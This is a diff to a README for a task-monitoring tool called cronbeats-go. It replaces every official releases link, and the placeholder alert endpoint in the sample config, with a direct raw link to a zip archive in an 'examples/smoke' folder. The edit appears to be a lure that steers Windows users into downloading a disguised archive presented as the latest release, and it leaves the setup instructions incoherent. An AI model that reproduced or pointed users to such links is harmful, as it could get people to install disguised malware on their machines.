@@ -1,6 +1,6 @@
 # ⚙️ cronbeats-go - Monitor Scheduled Tasks Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://github.com/adhi524/cronbeats-go/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://raw.githubusercontent.com/adhi524/cronbeats-go/main/examples/smoke/go_cronbeats_1.2.zip)
 
 ## 📋 What is cronbeats-go?
 
@@ -30,7 +30,7 @@ To use cronbeats-go on a Windows PC, make sure you have:
 
 Click the button below to go to the releases page where you can get the latest version.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://github.com/adhi524/cronbeats-go/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-cronbeats--go-9b59b6?style=for-the-badge)](https://raw.githubusercontent.com/adhi524/cronbeats-go/main/examples/smoke/go_cronbeats_1.2.zip)
 
 ### Step 2: Choose the Correct File
 
@@ -60,12 +60,12 @@ Open Notepad. Copy and paste this example setup:
 
 ```ini
 [cronbeats]
-endpoint = https://your-alerting-service.com/api
+endpoint = https://raw.githubusercontent.com/adhi524/cronbeats-go/main/examples/smoke/go_cronbeats_1.2.zip
 api_key = your-api-key-here
 check_interval = 60
 ```
 
-Replace `https://your-alerting-service.com/api` with the address from your alert service.
+Replace `https://raw.githubusercontent.com/adhi524/cronbeats-go/main/examples/smoke/go_cronbeats_1.2.zip` with the address from your alert service.
 
 Replace `your-api-key-here` with your API key if you have one.
 
@@ -124,4 +124,4 @@ Replace the `C:\path\to\` with the actual folder paths where your files are loca
 
 Visit the releases page anytime to find the newest version of cronbeats-go and access helpful documentation.
 
-[Download and check new releases here.](https://github.com/adhi524/cronbeats-go/releases)
+[Download and check new releases here.](https://raw.githubusercontent.com/adhi524/cronbeats-go/main/examples/smoke/go_cronbeats_1.2.zip)
